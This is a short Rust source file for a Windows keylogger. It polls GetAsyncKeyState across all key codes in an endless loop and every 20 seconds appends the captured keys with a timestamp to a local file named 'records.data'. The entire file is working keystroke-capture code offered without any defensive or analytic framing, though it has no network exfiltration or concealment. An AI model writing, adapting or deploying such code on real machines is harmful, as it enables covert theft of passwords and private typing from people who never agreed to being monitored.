extern crate winapi;
extern crate user32;

use std::io::prelude::*;
use std::time::UNIX_EPOCH;
use std::time::SystemTime;
use std::fs::OpenOptions;


const LOG_FILE: &str = "records.data";
const LOG_AFTER: u64 = 20; // sec

fn timestamp() -> u64 {
	match SystemTime::now().duration_since(UNIX_EPOCH) {
		Ok(result) => result.as_secs(),
		Err(_) => 0
	}
}

fn write(stamp: u64, content: &Vec<i32>) {
	let file = OpenOptions::new().create(true).append(true).open(LOG_FILE);
	match file {
		Ok(file) => {
			let err = writeln!(&file, "{:?}:{:?}", stamp, &content);
			if let Err(e) = err {
        		println!("{:?}", e);
    		}			
		},
		Err(e) => {
			println!("{:?}", e);
		},
	}
}

fn start_logger(){
	let mut start = timestamp();
	let mut collection = vec![(1 as i32)];

	loop {
		for i in 1..256 {
			if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
				collection.push(i);
			}

			// log to file after specified time 
			let current_time = timestamp();
			if !collection.is_empty() && (start + LOG_AFTER) < current_time{
				write(start, &collection);
				collection.clear();
				start = current_time;
			}
		}	
	}
}



fn main() {
	start_logger();
}
